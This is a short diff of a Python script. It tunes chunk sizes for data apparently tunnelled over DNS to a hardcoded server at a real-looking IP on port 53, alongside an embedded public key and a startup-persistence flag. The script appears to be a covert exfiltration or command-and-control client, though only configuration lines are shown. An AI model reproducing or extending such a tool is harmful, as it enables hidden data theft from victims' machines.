@@ -14,7 +14,7 @@ MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEUnWlQdwMyM3H+bJdfJGRGAY/pfkD
 byS6+yVLuZj8YtvOsRb6mQyXBUUdvckfTDh5jdudZT9pMGJgWMhNPXlQ+w==
 -----END PUBLIC KEY-----"""
 target_pub_key = None
-CHUNK_SIZE = 20 # تم التعديل ليتناسب مع CVC (30 data + 6 header)
+CHUNK_SIZE = 13 # CVC Config: 13 bytes max (7 data + 6 header) → max 12 CVCs → 5 label depth
 IS_ADDED_TO_STARTUP = False
 SERVER = ("20.63.24.136", 53)
 sent_chunks = {}
